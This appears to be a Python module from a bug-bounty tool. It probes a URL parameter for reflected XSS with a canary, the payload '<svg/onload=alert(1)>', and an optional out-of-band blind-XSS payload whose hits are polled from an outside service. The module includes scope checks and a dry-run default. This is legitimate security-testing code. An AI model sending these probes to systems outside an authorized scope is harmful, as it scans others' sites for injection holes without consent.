"""Capped reflected XSS canary probe (authorized bounty only)."""

from __future__ import annotations

import json
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from typing import Any

from .. import ui
from ..redaction import redact_text
from .base import RunnerResult, require_in_scope

CANARY = "hackbotXSS1337"
PROBE = f'<svg/onload=alert(1)>//{CANARY}'


def xss_probe(
    target_dir: Path,
    url: str,
    *,
    param: str = "q",
    approve: bool = False,
    force: bool = False,
    timeout: float = 12.0,
    use_oob: bool = True,
) -> RunnerResult:
    require_in_scope(target_dir, url, action="xss reflection probe", force=force)
    parsed = urllib.parse.urlparse(url if "://" in url else f"https://{url}")
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    oob_canary = None
    if use_oob:
        try:
            from ..oob import mint_canary, oob_configured

            if oob_configured():
                oob_canary = mint_canary(kind="xss")
        except Exception:  # noqa: BLE001
            oob_canary = None
    plan = {
        "url": url,
        "param": param,
        "canary": CANARY,
        "approve": approve,
        "oob": bool(oob_canary),
    }
    ui.code_panel(json.dumps(plan, indent=2), title="xss_probe", lexer="json")
    cmd = ["xss_probe", url, f"param={param}"]
    if not approve:
        ui.dry_run_banner()
        return RunnerResult(cmd, False, None, json.dumps({"dry_run": True, **plan}), "", "dry-run")

    results: list[dict[str, Any]] = []
    reflected = False
    raw_reflect = False
    probes: list[tuple[str, str]] = [(CANARY, "canary"), (PROBE, "probe")]
    if oob_canary and oob_canary.get("xss_payloads"):
        probes.append((str(oob_canary["xss_payloads"][0]), "oob_fetch"))
    for value, label in probes[:3]:
        qs2 = dict(qs)
        qs2[param] = [value]
        query = urllib.parse.urlencode({k: v[0] if v else "" for k, v in qs2.items()})
        probe_url = urllib.parse.urlunparse(
            (parsed.scheme, parsed.netloc, parsed.path, "", query, "")
        )
        try:
            from ..scoped_http import scoped_fetch_bytes

            resp = scoped_fetch_bytes(
                probe_url,
                target_dir=target_dir,
                action="xss reflection probe",
                force=force,
                timeout=timeout,
                headers={"User-Agent": "hackbot-xss-probe"},
                max_bytes=120_000,
                gate_initial=False,
            )
            status = resp.status
            body = resp.body.decode("utf-8", errors="replace")
        except Exception as exc:  # noqa: BLE001
            results.append({"label": label, "error": f"{type(exc).__name__}: {exc}"})
            continue
        has_canary = CANARY in body
        has_raw = "<svg" in body.lower() and CANARY in body
        if has_canary:
            reflected = True
        if has_raw:
            raw_reflect = True
        results.append(
            {
                "label": label,
                "status": status,
                "canary_reflected": has_canary,
                "raw_markup_reflected": has_raw,
                "preview": redact_text(body[:200]),
            }
        )

    signal = reflected
    reason = "no reflection"
    if raw_reflect:
        reason = "canary + raw markup reflected (likely XSS sink)"
    elif reflected:
        reason = "canary reflected (encoding unknown — triage)"

    payload: dict[str, Any] = {
        "url": url,
        "param": param,
        "signal": signal,
        "reason": reason,
        "raw_markup": raw_reflect,
        "results": results,
        "canary": oob_canary,
    }
    if oob_canary:
        try:
            from ..oob import persist_last_canary, wait_and_poll

            persist_last_canary(target_dir, oob_canary)
            poll = wait_and_poll(oob_canary, rounds=2, delay_sec=1.5)
            payload["oob_poll"] = poll
            if poll.get("signal"):
                payload["signal"] = True
                payload["reason"] = "blind XSS OOB/Interactsh canary hit"
        except Exception:  # noqa: BLE001
            pass
    ui.code_panel(json.dumps(payload, indent=2)[:3000], title="xss_probe result", lexer="json")
    return RunnerResult(cmd, True, 0, json.dumps(payload), "", "executed")
